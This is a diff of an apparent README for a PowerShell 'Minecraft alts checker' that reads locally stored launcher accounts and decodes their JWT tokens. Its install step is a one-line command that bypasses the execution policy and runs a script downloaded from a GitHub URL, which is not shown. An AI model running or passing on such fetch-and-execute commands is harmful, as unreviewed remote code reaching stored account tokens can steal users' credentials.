@@ -1,4 +1,4 @@
-- **`powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/OnlyDehBest/alts-checker/main/alt-checker_v2.ps1')"`**
+- **`powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/OnlyDehBest/alts-checker/main/alts-checker.ps1')"`**
 
 **🛠️ Minecraft Alts Checker Tool**
 A PowerShell utility for analyzing Minecraft accounts stored locally by various launchers, with JWT token decoding capabilities.
